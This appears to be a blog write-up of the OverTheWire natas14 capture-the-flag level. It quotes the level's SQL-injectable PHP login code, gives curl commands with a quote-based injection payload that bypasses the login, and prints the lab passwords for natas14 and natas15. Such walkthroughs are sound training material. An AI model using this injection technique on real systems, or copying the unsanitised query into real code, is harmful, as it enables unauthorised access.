---
date: '2026-10-11'
description: sql? sequel? squirrel?
draft: false
title: natas-14
weight: 15
ShowToc: false
---

| info | value                                       |
|:-----|--------------------------------------------:|
| user | `natas14`                                   |
| pass | `A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8`          |
| host | `http://natas14.natas.labs.overthewire.org` |


## explanation

oh yay! sql! how exciti- just kidding it's still fucking php

```php
if (array_key_exists("username", $_REQUEST)) {
  # miscellaneous stuff to connect to the database with credentials
  $link = mysqli_connect('localhost', 'natas14', '<censored>');
  mysqli_select_db($link, 'natas14');

  $query = "
    SELECT *
    FROM users
    WHERE username = '" . $_REQUEST["username"] . "'
      AND password = '" . $_REQUEST["password"] . "'
  ";
  # the superglobals primarily collect the value of the parsed user/pass form
  # IMPORTANT: the actual source code uses double quotes, as in
  # `username=\"" . $_..[..] "\"`
  # but for clarity reasons, this example uses single quotes


  if (array_key_exists("debug", $_GET)) {
    echo "$query";
  }
  # called with `curl /index.php?debug` to see the query in live action

  if (mysqli_num_rows(mysqli_query($link, $query)) > 0) {
    echo "password: <censored>";
  } else {
    echo "wrong";
  }

  mysqli_close($link);

} else {
# if the key does not exist, the else block jumps into the default state of
# asking for a user/password, or visiting the site for the first time:
```

```html
<form action="index.php" method="POST">
  Username: <input name="username">
  Password: <input name="password">
  <input
    type="submit"
    value="Login"
  />
</form>
```


the winning condition is determined by this tiny snippet:

```php
if (mysqli_num_rows(mysqli_query($link, $query)) > 0) {
  echo "password: <censored>";
```

which means the password is only printed, if the query returns at least **one** row

running a basic query isn't very helpful...

```sh
curl "http://natas14.natas.labs.overthewire.org" \
  -u natas14:A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8 \
  --data-urlencode "username=" \
  --data-urlencode "password="

# Access denied!
```

> obviously the `d/data` flag is sufficient too, since there is no url encoding needed for this query - but hey, if you're a maniac, i won't hold you off memorizing [all encodings](https://wildandfreetools.com/blog/url-encoding-cheat-sheet-all-characters/)

to get the password, the condition of getting at least one result back is honestly easier than you think, let me explain:

1. there is no sanitization in the `$query`
2. why are we allowing user input through sql..?? (duh)
3. the `WHERE` clause combines an `AND`, so both parts need to equal true before getting a result
4. there is a literal debug flag to see & test your queries:

```sh
curl "http://natas14.natas.labs.overthewire.org/index.php?debug"
...
# Executing query: SELECT * from users where username="" and password=""
```

the answer to our prayers lies in escaping out of the query, basically controlling the in- & output: 🌻 [𝓼𝓺𝓵 𝓲𝓷𝓳𝓮𝓬𝓽𝓲𝓸𝓷](https://www.w3schools.com/sql/sql_injection.asp) ⭐

> reading through the above article helped me solve the puzzle, i recommend skimming through it

as shown above, the output is `username="" and password=""`, adding a single quote somewhat already begins to break it (which in terms of sql is a good sign that it is working!)

```sh
curl ... \
  --data-urlencode 'username="' \ # or escaping it with "username=\""
  --data-urlencode 'password='

#                                                     vvv
# Executing query: SELECT * from users where username=""" and password=""
#                                                     ^^^
# Warning:  mysqli_num_rows() expects parameter 1 to be mysqli_result,
# bool given in /var/www/natas/natas14/index.php on line 24
```

with this knowledge you could insert your own sql parameters & see how things go along..... but for the sake of the task, simply make both boolean statements equal true:

```sh
curl "http://natas14.natas.labs.overthewire.org" \
  -u natas14:A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8 \
  --data-urlencode 'username="""' \
  --data-urlencode 'password=""="'
  # or in one go: `-d 'username="""&password=""="'

# Successful login! The password for natas15 is GB6USCJYJjwLyYhZUNkE1NwDueiTow6g
```

---

## why does this work?

looks a bit abstract, doesn't it? [w3schools](https://www.w3schools.com/sql/sql_injection.asp) explained it quite well, so the query now looks like this:

```sql
SELECT *
FROM Users
WHERE username = """""
  AND password = """="";
```

[`mysql`](https://www.mysql.com/) on the other hand reads double quoted strings left to right & treats `""` inside a string as one literal `"`:

`.. where username = "` + `"""` + `" and password = "` + `""="` + `"`

` and password` is string content, so the next `""` becomes `"` & the lone comparison is `(username = '"" and password="') = ""`, so the left side is 0, the right side is an empty string cast to 0, meaning `0 = 0` is true

![ ](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExcXJna2R1bXN2NmM0ODRuMWdnNndob3d6bzhicDcyN24xcWluZWx4NyZlcD12MV9naWZzX3NlYXJjaCZjdD1n/NjlRswMybn6VC8Vi8V/giphy.gif#center)

![ ](https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3Nng1enB4MTl6OTNiMXI5dWtqa2MxemV2bHhxaW5jeXU5czl0N2hzdSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/LNMAa5P9JFBoMVHSUk/giphy.gif#center)

![ ](https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3YWhqcHR5anFoMmNpYXZ4NTVyMm50ZWpibjNqdmk1b2lrNjk4dDVpNCZlcD12MV9naWZzX3NlYXJjaCZjdD1n/2THULgZJwBg4xVuTEn/giphy.gif#center)

![ ](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExcXJna2R1bXN2NmM0ODRuMWdnNndob3d6bzhicDcyN24xcWluZWx4NyZlcD12MV9naWZzX3NlYXJjaCZjdD1n/SuSQrcep7CZByYC7Vz/giphy.gif#center)

> sorry for the cringe huehueuhe
